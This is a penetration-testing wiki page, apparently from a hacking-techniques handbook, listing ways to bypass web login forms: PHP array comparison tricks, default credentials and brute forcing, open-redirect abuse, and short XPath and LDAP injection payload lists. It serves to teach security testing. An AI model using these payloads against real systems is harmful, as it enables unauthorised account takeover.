# Login Bypass

## **Bypass regular login**

If you find a login page, here you can find some techniques to try to bypass it:

* Check for **comments** inside the page \(scroll down and to the right?\)
* Check if you can **directly access the restricted pages**
* Check to **not send the parameters** \(do not send any or only 1\)
* Check the **PHP comparisons error:** _user\[\]=a&pwd=b_ , _user=a&pwd\[\]=b_ , _user\[\]=a&pwd\[\]=b_
* Check credentials:
  * [**Default credentials**](../../brute-force.md#default-credentials) ****of the technology/platform used
  * **Common combinations** \(root, admin, password, name of the tech, default user with one of these passwords\).
  * Create a dictionary using **Cewl**, **add** the **default** username and password \(if there is\) and try to brute-force it using all the words as **usernames and password**
  * **Brute-force** using a bigger **dictionary \(**[**Brute force**](../../brute-force.md#http-post-form)**\)**

### SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **SQL injections**](../sql-injection/#authentication-bypass).

In the following page you can find a **custom list to try to bypass login** via SQL Injections:

{% page-ref page="sql-login-bypass.md" %}

### No SQL Injection authentication bypass

[Here you can find several tricks to bypass the login via **No SQL Injections.**](../nosql-injection.md#basic-authentication-bypass)\*\*\*\*

As the NoSQL Injections requires to change the parameters value, you will need to test them manually.

### XPath Injection authentication bypass

[Here you can find several tricks to bypass the login via **XPath Injection.**](../xpath-injection.md#authentication-bypass)\*\*\*\*

```text
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

### LDAP Injection authentication bypass

[Here you can find several tricks to bypass the login via **LDAP Injection.**](../ldap-injection.md#login-bypass)\*\*\*\*

```text
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

### Remember Me

If the page has "**Remember Me**" functionality check how is it implemented and see if you can abuse it to **takeover other accounts**.

### Redirects

Pages usually redirects users after login, check if you can alter that redirect to cause an [**Open Redirect**](../open-redirect.md). Maybe you can steal some information \(codes, cookies...\) if you redirect the user to your web.

## Other Checks

* Check if you can **enumerate usernames** abusing the login functionality.
* Check if **auto-complete** is active in the password/**sensitive** information **forms** **input:** `<input autocomplete="false"`

